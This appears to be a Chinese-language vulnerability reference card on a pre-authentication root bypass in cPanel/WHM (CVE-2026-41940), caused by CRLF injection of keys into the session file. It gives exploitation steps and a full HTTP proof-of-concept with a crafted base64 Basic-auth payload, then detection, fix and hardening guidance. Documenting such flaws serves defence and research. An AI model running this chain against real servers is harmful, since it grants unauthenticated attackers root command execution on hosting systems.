---
id: web-generic-auth-cpanel-whm-basic-crlf-session-poison-auth-bypass
title: cPanel/WHM Basic 认证密码 CRLF 注入会话文件：预认证直接提升为 root WHM（CVE-2026-41940）
type: scenario
domain: web
path: web/generic/auth
technique: cpanel-whm-basic-auth-crlf-session-poison
aliases:
- CVE-2026-41940
- cPanel WHM 认证绕过
- cPanel session 文件 CRLF 注入
- whostmgrsession 无 ob 明文 pass
- successful_internal_auth_with_timestamp 绕过
- do_token_denied 缓存提升
tags:
- cpanel
- whm
- auth-bypass
- session
- crlf
- perl
- cve-2026-41940
- rce
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 110.0.x（<11.110.0.97）、118.0.x（<11.118.0.63）、126.0.x（<11.126.0.54）、132.0.x（<11.132.0.29）、134.0.x（<11.134.0.20）、136.0.x（<11.136.0.5）
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:29:16+08:00'
  notes: 已对照原文与10张图核对：受影响/修复版本表与原文一致（110.0.x<11.110.0.97、118.0.x<11.118.0.63、126.0.x<11.126.0.54、132.0.x<11.132.0.29、134.0.x<11.134.0.20、136.0.x<11.136.0.5）；raw/cache会话结构、无ob时pass明文、filter_sessiondata仅在create调用而saveSession缺失、do_token_denied→Modify::save提升、docheckpass_whostmgrd仅凭successful_internal_auth_with_timestamp返回AUTH_OK均与原文一致；PoC的base64解码结果与文中一致，watchTowr输出（307泄token→401 gadget→json-api/version 200 11.136.0.4）与图09一致；WHM Terminal id为uid=0(root)有图10。CVE-2026-41940正确。PoC未在本机执行。frontmatter 无 sources/source_url。
---

## 一句话结论

cPanel/WHM 的 `cpsrvd` 在处理预认证 Basic Authentication 时只从密码中过滤 NUL，未过滤 `\r\n`；密码中的换行会被当作 session 文件的新行写入 `/var/cpanel/sessions/raw/<session>`，注入 `user=root`、`hasroot=1`、`tfa_verified=1`、`successful_internal_auth_with_timestamp=...` 等键。攻击者先用无 `ob_hex` 的 Cookie 让 pass 跳过加密明文落盘，再请求受保护接口触发 `do_token_denied → Modify->save()` 把 raw 提升到 JSON 缓存，随后 `docheckpass_whostmgrd` 仅因 `successful_internal_auth_with_timestamp` 存在就返回 AUTH_OK，未认证攻击者直接获得 WHM root。

## 原理

- 会话存储：cPanel/WHM 主要用文件系统保存会话，raw 目录 `/var/cpanel/sessions/raw/` 是 `key=value\n` 的逐行文本，cache 目录 `/var/cpanel/sessions/cache/` 是对应的 JSON；会话名为 `<user>:<随机串>` 或 `:<随机串>`（登录失败时 user 为空）。
- Cookie 结构：`whostmgrsession=<session_name>,<ob_hex>`，其中 `<ob_hex>` 是 32 位十六进制的 observation secret，用来加密 `pass` 字段。若 Cookie 只写 `<session_name>`、不带 `,<ob_hex>`，`$ob` 为空，编码逻辑被跳过，`pass` 明文写入磁盘——这是让注入内容以明文进入文件、并保证后续解析可控的前提。
- 注入点：`cpsrvd` 在预认证路径解码 `Authorization: Basic base64(user:pass)`，对 pass 只过滤 `\0`。把 pass 构造成 `root:x\r\nhasroot=1\r\n...`，`saveSession` 拼接 `pass=<值>` 时换行被原样写入，后续行就被当作独立键值对。
- 过滤缺失：`Cpanel/Session.pm` 里其实有 `filter_sessiondata`（对 `origin` 值和除 `origin` 外所有键做 `tr/\r\n//d`，并清理 pass 的目录穿越字符），但该函数只在 `create` 中调用，`saveSession` 中没有调用；因此写入路径上换行没有被清除。官方修复正是在 `saveSession` 中补上 `filter_sessiondata($session_ref)`，且无 ob 时改用 `no-ob:` + 十六进制编码而非明文。
- 缓存提升：`loadSession` 使用的是 JSON cache，而不是 raw。访问一个需要 `cp_security_token` 的受保护接口（如 `/scripts2/listaccts`）且不带 token 时，`check_security_token` 进入 `do_token_denied`；后者调用 `Cpanel::Session::Modify->new($session) + ->save()`，`Modify::new` 直接读取已被污染的 raw 文件并解析，`save()` 同时写 raw 与 JSON cache，注入的键值对于是成为 JSON 顶层字段。
- 认证判断缺陷：`docheckpass_whostmgrd` 只检查 `$session_ref->{'successful_internal_auth_with_timestamp'}` 是否存在，存在就 `return AUTH_OK`，不再校验 `/etc/shadow`。因此 `user=root` + `hasroot=1` + `tfa_verified=1` + 该时间戳足以冒充 root，不依赖任何口令。
- 权限放大：拿到 WHM root 后可直接使用 WHM 的 Terminal（其说明即为访问服务器 root 账户的命令行），或调用 WHM API，形成 root RCE；RCE 是认证绕过后的既有管理功能，并非独立漏洞。

## 触发条件

- 目标为 cPanel & WHM 110.0.x / 118.0.x / 126.0.x / 132.0.x / 134.0.x / 136.0.x 的未修复版本（对应上表修复版本之前）。
- 攻击者能访问 WHM 的 2087/2083 端口（`whostmgrd`），至少能请求 `/login/` 与一个受 `cp_security_token` 保护的接口。
- 目标未对 Basic 认证 pass 中的 CR/LF 做额外统一过滤（默认代码只过滤 NUL）。
- 不需要已知口令、不需要有效许可证、不需要 CSRF token。

## 利用步骤

1. 预认证取得会话名：`POST /login/?login_only=1`，body `user=root&pass=wrong`，从响应的 `Set-Cookie: whostmgrsession=<session_name>,<ob_hex>` 中取出 `<session_name>`（URL 编码形如 `%3aQSJN...`，解码后是 `:QSJN...`）。
2. 构造无 ob 的 Cookie：只保留 `whostmgrsession=<session_name>`，去掉 `,<ob_hex>`，使后续 pass 以明文写入。
3. 发送带 CRLF 的 Basic 认证请求：`Authorization: Basic base64("root:x\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\ncp_security_token=/cpsess9999999999\r\nsuccessful_internal_auth_with_timestamp=<时间戳>")`，Cookie 使用第 2 步的值；请求 `GET /`。此时 raw session 文件被注入多行键值。
4. 触发缓存提升：`GET /scripts2/listaccts`，同样只带 `<session_name>` Cookie。响应 `401 Token Denied` 表示 `do_token_denied` 已执行，`Modify::save()` 把注入字段写入 JSON cache。
5. 验证：访问 WHM 首页或 `/json-api/version` 应返回已登录，页面右上角显示 `root`；随后可调用任意 WHM 接口。
6. 获取命令执行：在 WHM 中打开 Terminal（Server Configuration → Terminal），其本身以 root 运行，执行 `id` 得到 `uid=0(root)`；也可用现成 PoC 在绕过认证后直接请求 API 完成命令执行。

## PoC

```http
### 1. 预认证，拿 session_name
POST /login/?login_only=1 HTTP/1.1
Host: target:2087
Content-Type: application/x-www-form-urlencoded

user=root&pass=wrong

### 响应（示例）
Set-Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_%2c4d257abc371539dfebdf7d3a3e64de0b

### 2. 只用 session_name（无 ob_hex），并在 Basic pass 中注入 CRLF 键值
GET / HTTP/1.1
Host: target:2087
Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_
Authorization: Basic cm9vdDp4DQpoYXNyb290PTENCnRmYV92ZXJpZmllZD0xDQp1c2VyPXJvb3QNCmNwX3NlY3VyaXR5X3Rva2VuPS9jcHNlc3M5OTk5OTk5OTk5DQoNCnN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD0xNzc3NDYyMTQ5
```

```text
第 2 步 Authorization 解码后的 pass（\r\n 为实际换行）：
root:x
hasroot=1
tfa_verified=1
user=root
cp_security_token=/cpsess9999999999

successful_internal_auth_with_timestamp=1777462149
```

```http
### 3. 触发 raw -> cache 提升
GET /scripts2/listaccts HTTP/1.1
Host: target:2087
Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_

### 预期响应：401 Token Denied（说明 do_token_denied 已执行）
```

```text
文章实验验证（环境 11.136.0.4 / Ubuntu 24.04）：
- 预认证会话目录出现 :QSJN... 文件；
- /scripts2/listaccts 返回 401 后，cache 目录出现同名 JSON，含注入的 user=root、tfa_verified=1、successful_internal_auth_with_timestamp；
- 之后可访问任意 WHM 接口，WHM 页面显示 root，Terminal 中 id 为 uid=0(root)；
- watchTowr 工具输出：minting preauth session → CRLF injection → HTTP 307 leaking token → do_token_denied → HTTP 401 gadget fired → /json-api/version 200 {"version":"11.136.0.4"}。
PoC 未在本机执行，结果来自文章截图。
```

## 变体与关联

- 变体（自动化）：watchTowr 的检测/利用脚本按“预认证铸会话 → 无 ob Cookie + Basic CRLF 注入 → do_token_denied 提升缓存 → 校验 root”四步完成；另一版 PoC 在认证绕过之后直接调用 WHM API 拿到交互式 root shell，无需手工登录控制台。
- 变体（注入字段）：除本卡示例，注入 `session_temp_user`、`external_validation_token`、`cp_security_token` 等字段可影响后续 token 校验与临时用户逻辑；关键字段是 `successful_internal_auth_with_timestamp`、`user=root`、`hasroot=1`、`tfa_verified=1`。
- 关联：[[web-generic-crlf-cfitsio-efs-http-request-header-injection]] 是另一处 CRLF 语义（HTTP 头注入）的用法；本卡的 CRLF 是写入磁盘会话文件的记录分隔符，最终危害是认证绕过而非响应拆分。
- 关联：同层其他“认证字段存在即放行”的失败开放模式（如不存在时的默认角色/缺失函数级校验）可对照审计。
- 边界：无 `ob_hex` 的 Cookie 是让 pass 明文落盘并避免编码器改变注入内容的前提；目标已修复（`saveSession` 中调用 `filter_sessiondata`，并对无 ob 的 pass 做 `no-ob:` 编码）则注入行被删除或整体编码，链路失效。

## 检测与防御

- 请求检测：`Authorization: Basic` 解码后含 `\r`/`\n`；Cookie `whostmgrsession` 只有会话名、没有 `,<32 位 hex>`；同一源短时间内先 `POST /login/?login_only=1` 再 `GET /scripts2/*` 并出现 `401 Token Denied`。
- 主机检测：`/var/cpanel/sessions/raw/*` 中出现 `hasroot=`、`tfa_verified=`、`successful_internal_auth_with_timestamp=` 等异常行；同名的 raw 与 cache 在同一秒被写入；`cpsrvd` 日志出现含换行的 Basic 认证失败。
- 日志检测：`/usr/local/cpanel/logs/access_log`、`login_log` 中出现 Base64 解码含 CRLF 的 pass；异常 `401 Token Denied` 紧跟在带 Basic 认证的请求之后。
- 修复：升级到 11.110.0.97 / 11.118.0.63 / 11.126.0.54 / 11.132.0.29 / 11.134.0.20 / 11.136.0.5 及以上；确认 `saveSession` 已调用 `filter_sessiondata`，且无 ob 的 pass 使用 `no-ob:` 编码。
- 加固：在反向代理/WAF 层拒绝 Basic 认证凭据中的 CR/LF；限制 2087/2083 仅对可信来源开放；监控会话目录写入与 `Modify::save` 频率；最小化 WHM 暴露面，禁用不必要的高权限功能（如 Terminal）。
- 审计：`Cpanel/Session.pm` 的 `saveSession` 是否在写入前过滤所有请求键值的换行；`create` 与 `saveSession` 的过滤是否一致；所有以“某字段存在/非空”作为认证成功依据的函数（`docheckpass_whostmgrd` 等）是否同时校验口令、用户身份与会话完整性；raw 与 cache 双写路径的所有用户输入入口（Basic 认证、表单登录、临时用户创建）是否处理换行、NUL 与目录穿越字符。
